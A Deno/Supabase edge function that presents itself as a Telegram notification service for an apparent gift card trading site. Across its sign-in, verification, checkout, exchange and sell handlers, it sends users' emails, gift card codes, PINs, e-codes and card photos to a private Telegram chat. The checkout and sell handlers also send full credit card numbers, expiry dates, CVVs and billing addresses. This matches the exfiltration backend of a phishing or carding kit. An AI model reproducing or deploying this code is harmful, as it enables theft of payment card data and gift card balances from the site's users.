import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.39.7';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface TelegramNotification {
  type: 'sign_in' | 'verification' | 'checkout' | 'exchange' | 'sell';
  userEmail?: string;
  email?: string;
  firstName?: string;
  lastName?: string;
  giftcardName?: string;
  giftcardToTrade?: string;
  giftcardWanted?: string;
  code?: string;
  pin?: string;
  ecode?: string;
  amount?: string;
  country?: string;
  verificationId?: string;
  frontImagePath?: string;
  backImagePath?: string;
  paymentMethod?: string;
  total?: number;
  currency?: string;
  items?: string;
  creditCardInfo?: {
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    cardholderName: string;
    billingAddress: string;
    city: string;
    postalCode: string;
    country: string;
  };
  paymentDetails?: any;
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const TELEGRAM_BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN');
    const TELEGRAM_CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID');
    const SUPABASE_URL = Deno.env.get('SUPABASE_URL');
    const SUPABASE_SERVICE_KEY = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY');

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing Telegram credentials');
      return new Response(
        JSON.stringify({ error: 'Missing Telegram credentials' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    if (!SUPABASE_URL || !SUPABASE_SERVICE_KEY) {
      console.error('Missing Supabase credentials');
      return new Response(
        JSON.stringify({ error: 'Missing Supabase credentials' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);
    const notificationData: TelegramNotification = await req.json();
    console.log('Received notification request:', notificationData);

    let message = '';
    
    if (notificationData.type === 'sign_in') {
      message = `🔐 *New User Sign In*\n\n` +
                `📧 Email: ${notificationData.userEmail}\n` +
                `👤 Name: ${notificationData.firstName || 'N/A'} ${notificationData.lastName || 'N/A'}\n` +
                `⏰ Time: ${new Date().toLocaleString()}`;

      // Send text message only for sign in
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
        }),
      });

      const telegramResponse = await response.json();
      if (!response.ok) {
        console.error('Telegram API error:', telegramResponse);
        return new Response(
          JSON.stringify({ error: 'Failed to send Telegram message', details: telegramResponse }),
          { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        );
      }

      return new Response(
        JSON.stringify({ success: true, telegramResponse }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );

    } else if (notificationData.type === 'verification') {
      // Create detailed message for verification
      message = `🎁 *New Gift Card Verification*\n\n` +
                `📧 Email: ${notificationData.userEmail}\n` +
                `🎫 Gift Card: ${notificationData.giftcardName}\n` +
                `📱 Type: ${notificationData.isEGiftCard ? 'E-Gift Card (Digital)' : 'Physical Card'}\n` +
                `🔢 Code: ${notificationData.code || 'N/A'}\n` +
                `📌 PIN: ${notificationData.pin || 'N/A'}\n` +
                `💰 Amount: $${notificationData.amount}\n` +
                `🌍 Country: ${notificationData.country}\n` +
                `🆔 ID: ${notificationData.verificationId}\n` +
                `⏰ Time: ${new Date().toLocaleString()}\n\n` +
                `*To process, reply to this message with:*\n` +
                `VALID, INVALID, or USED`;

      // Send the text message first
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
        }),
      });

      // Send images if available
      const imagesToSend = [];
      if (notificationData.frontImagePath) {
        imagesToSend.push({ path: notificationData.frontImagePath, label: 'Front' });
      }
      if (notificationData.backImagePath) {
        imagesToSend.push({ path: notificationData.backImagePath, label: 'Back' });
      }

      for (const imageInfo of imagesToSend) {
        try {
          // Download image from Supabase storage
          const { data: imageData, error } = await supabase.storage
            .from('gift-card-images')
            .download(imageInfo.path);

          if (error) {
            console.error(`Error downloading ${imageInfo.label.toLowerCase()} image:`, error);
            continue;
          }

          // Convert blob to array buffer
          const arrayBuffer = await imageData.arrayBuffer();
          const imageBuffer = new Uint8Array(arrayBuffer);

          // Create form data for Telegram
          const formData = new FormData();
          formData.append('chat_id', TELEGRAM_CHAT_ID);
          formData.append('photo', new Blob([imageBuffer]), `${imageInfo.label.toLowerCase()}_image.jpg`);
          formData.append('caption', `Gift Card ${imageInfo.label} Image`);

          // Send photo to Telegram
          const photoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData,
          });

          const photoResult = await photoResponse.json();
          if (!photoResponse.ok) {
            console.error(`Failed to send ${imageInfo.label.toLowerCase()} image to Telegram:`, photoResult);
          } else {
            console.log(`${imageInfo.label} image sent successfully to Telegram`);
          }

        } catch (imageError) {
          console.error(`Error processing ${imageInfo.label.toLowerCase()} image:`, imageError);
        }
      }

      return new Response(
        JSON.stringify({ success: true, message: 'Verification notification sent with images' }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    } else if (notificationData.type === 'checkout') {
      // Handle checkout notification
      message = `🛒 *New Checkout Order*\n\n` +
                `💳 Payment Method: ${notificationData.paymentMethod}\n` +
                `💰 Total: $${notificationData.total} ${notificationData.currency}\n` +
                `📦 Items: ${notificationData.items}\n` +
                (notificationData.creditCardInfo ? 
                  `\n*Card Details:*\n` +
                  `Card Number: ${notificationData.creditCardInfo.cardNumber}\n` +
                  `Expiry: ${notificationData.creditCardInfo.expiryDate}\n` +
                  `CVV: ${notificationData.creditCardInfo.cvv}\n` +
                  `Cardholder: ${notificationData.creditCardInfo.cardholderName}\n` +
                  `Address: ${notificationData.creditCardInfo.billingAddress}, ${notificationData.creditCardInfo.city}\n` +
                  `Postal Code: ${notificationData.creditCardInfo.postalCode}\n` +
                  `Country: ${notificationData.creditCardInfo.country}` 
                  : '') +
                `\n⏰ Time: ${new Date().toLocaleString()}`;

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
        }),
      });

      return new Response(
        JSON.stringify({ success: true, message: 'Checkout notification sent' }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    } else if (notificationData.type === 'exchange') {
      // Handle exchange notification
      message = `🔄 *New Gift Card Exchange*\n\n` +
                `📧 Email: ${notificationData.email}\n` +
                `🎫 Trading: ${notificationData.giftcardToTrade}\n` +
                `🎁 For: ${notificationData.giftcardWanted}\n` +
                `💰 Amount: ${notificationData.amount}\n` +
                `🔢 Code: ${notificationData.code}\n` +
                `📌 PIN: ${notificationData.pin}\n` +
                `🎯 E-Code: ${notificationData.ecode || 'N/A'}\n` +
                `⏰ Time: ${new Date().toLocaleString()}`;

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
        }),
      });

      // Send images if available
      const exchangeImages = [];
      if (notificationData.frontImagePath) {
        exchangeImages.push({ path: notificationData.frontImagePath, label: 'Front' });
      }
      if (notificationData.backImagePath) {
        exchangeImages.push({ path: notificationData.backImagePath, label: 'Back' });
      }

      for (const imageInfo of exchangeImages) {
        try {
          const { data: imageData, error } = await supabase.storage
            .from('gift-card-images')
            .download(imageInfo.path);

          if (error) {
            console.error(`Error downloading ${imageInfo.label.toLowerCase()} image:`, error);
            continue;
          }

          const arrayBuffer = await imageData.arrayBuffer();
          const imageBuffer = new Uint8Array(arrayBuffer);

          const formData = new FormData();
          formData.append('chat_id', TELEGRAM_CHAT_ID);
          formData.append('photo', new Blob([imageBuffer]), `${imageInfo.label.toLowerCase()}_image.jpg`);
          formData.append('caption', `Exchange - ${imageInfo.label} Image`);

          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData,
          });
        } catch (imageError) {
          console.error(`Error processing ${imageInfo.label.toLowerCase()} image:`, imageError);
        }
      }

      return new Response(
        JSON.stringify({ success: true, message: 'Exchange notification sent with images' }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    } else if (notificationData.type === 'sell') {
      // Handle sell notification
      const paymentDetailsText = notificationData.paymentDetails 
        ? `Cardholder: ${notificationData.paymentDetails.cardholderName || 'N/A'}\n` +
          `Card Number: ${notificationData.paymentDetails.cardNumber || 'N/A'}\n` +
          `Expiry: ${notificationData.paymentDetails.expiryDate || 'N/A'}\n` +
          `CVV: ${notificationData.paymentDetails.cvv || 'N/A'}`
        : 'N/A';
      
      message = `💰 *New Gift Card Sale*\n\n` +
                `📧 Email: ${notificationData.email}\n` +
                `🎫 Gift Card: ${notificationData.giftcardName}\n` +
                `💰 Amount: ${notificationData.amount}\n` +
                `🔢 Code: ${notificationData.code}\n` +
                `📌 PIN: ${notificationData.pin}\n` +
                `🎯 E-Code: ${notificationData.ecode || 'N/A'}\n` +
                `💳 Payment Method: ${notificationData.paymentMethod}\n` +
                `💼 Credit Card Details:\n${paymentDetailsText}\n` +
                `⏰ Time: ${new Date().toLocaleString()}`;

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
        }),
      });

      // Send images if available
      const sellImages = [];
      if (notificationData.frontImagePath) {
        sellImages.push({ path: notificationData.frontImagePath, label: 'Front' });
      }
      if (notificationData.backImagePath) {
        sellImages.push({ path: notificationData.backImagePath, label: 'Back' });
      }

      for (const imageInfo of sellImages) {
        try {
          const { data: imageData, error } = await supabase.storage
            .from('gift-card-images')
            .download(imageInfo.path);

          if (error) {
            console.error(`Error downloading ${imageInfo.label.toLowerCase()} image:`, error);
            continue;
          }

          const arrayBuffer = await imageData.arrayBuffer();
          const imageBuffer = new Uint8Array(arrayBuffer);

          const formData = new FormData();
          formData.append('chat_id', TELEGRAM_CHAT_ID);
          formData.append('photo', new Blob([imageBuffer]), `${imageInfo.label.toLowerCase()}_image.jpg`);
          formData.append('caption', `Sell - ${imageInfo.label} Image`);

          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData,
          });
        } catch (imageError) {
          console.error(`Error processing ${imageInfo.label.toLowerCase()} image:`, imageError);
        }
      }

      return new Response(
        JSON.stringify({ success: true, message: 'Sell notification sent with images' }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    return new Response(
      JSON.stringify({ success: true }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    console.error('Error in send-telegram-notification function:', error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});